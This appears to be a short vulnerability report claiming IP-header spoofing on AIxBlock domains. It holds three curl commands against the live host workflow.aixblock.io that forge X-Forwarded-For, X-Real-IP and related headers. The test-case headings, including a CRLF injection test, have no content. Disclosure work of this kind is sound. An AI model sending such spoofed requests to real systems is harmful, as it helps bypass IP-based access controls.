Target: AIxBlock Domains

Severity: Medium (CVSS 5.3)

Vulnerability Description

The server accepts multiple IP-related headers without proper validation, allowing attackers to spoof their IP address and potentially bypass IP-based access controls.

Test Cases

Test 1: Basic IP Spoofing

Test 2: Multiple IP Headers

Test 3: Malicious IP Injection

Test 4: CRLF Injection in IP Headers

Manual Testing Commands

# Basic IP spoofing
curl -s "https://workflow.aixblock.io" \
  -H "X-Forwarded-For: 127.0.0.1" \
  -H "X-Real-IP: 192.168.1.1" \
  -v

# Multiple IP headers
curl -s "https://workflow.aixblock.io" \
  -H "X-Forwarded-For: 192.168.1.1, 10.0.0.1, 172.16.0.1" \
  -H "X-Real-IP: 127.0.0.1" \
  -v

# Malicious IP injection
curl -s "https://workflow.aixblock.io" \
  -H "X-Forwarded-For: 192.168.1.1" \
  -H "X-Real-IP: 10.0.0.1" \
  -H "X-Client-IP: 172.16.0.1" \
  -H "X-Originating-IP: 127.0.0.1" \
  -v
